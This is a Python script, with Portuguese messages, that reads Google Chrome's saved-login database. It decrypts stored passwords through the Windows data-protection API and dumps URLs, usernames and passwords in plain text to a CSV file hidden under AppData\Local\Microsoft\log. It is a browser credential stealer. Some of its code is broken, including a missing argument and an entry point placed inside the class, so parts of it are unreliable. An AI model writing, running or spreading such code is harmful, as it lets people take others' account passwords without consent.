import os, sys
import sqlite3
try:
    import win32crypt
except:
    pass

class ChromePass:

    def args_parser(self):
        self.csv(self.main())

    def main(self):
        info_list = []
        path = self.getpath()
        try:
            connection = sqlite3.connect(path + "Login Data")
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()

            if (os.name == "posix") and (sys.platform == "darwin"):
                raise Exception("ERRO: Mac OSX not supported.")

            for information in value:
                if os.name == 'nt':
                    password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                    if password:
                        info_list.append({
                            'origin_url': information[0],
                            'username': information[1],
                            'password': str(password.decode(encoding="utf-8", errors="strict"))
                        })



                elif os.name == 'posix':
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': information[2]
                    })

        except sqlite3.OperationalError as e:
            e = str(e)
            if (e == 'database is locked'):
                raise Exception("ERRO: o Chrome esta sendo executado.")
            elif (e == 'no such table: logins'):
                raise Exception("ERRO: Ha algo errado no nome da database do Chrome")
            elif (e == 'unable to open database file'):
                raise Exception("ERRO: Ha algo errado no caminho da database do Chrome")
            else:
                print(e)
                sys.exit(0)


        return info_list

    def getpath(self):
        if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
            if (os.path.isdir(PathName) == False):
                raise Exception("ERRO: Google Chrome nao foi encontrado.")
        elif ((os.name == "posix") and (sys.platform == "darwin")):
            # This is the OS X Path
            PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
            if (os.path.isdir(PathName) == False):
                raise Exception("ERRO: Google Chrome nao foi encontrado.")
        elif (os.name == "posix"):
            # This is the Linux Path
            PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
            if (os.path.isdir(PathName) == False):
                raise Exception("ERRO: Google Chrome nao foi encontrado.")

        return PathName

    def csv(self, info, dataName):
        chromepass = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\log\\" + dataName + "-SENHAS-CHROME.csv"
        with open(chromepass, 'wb') as csv_file:
            # csv_file.write('url, usern, sen \n'.encode('utf-8'))
            for data in info:
                csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
        print("-> Senhas salvas:", chromepass)


    if __name__ == '__main__':
        args_parser()
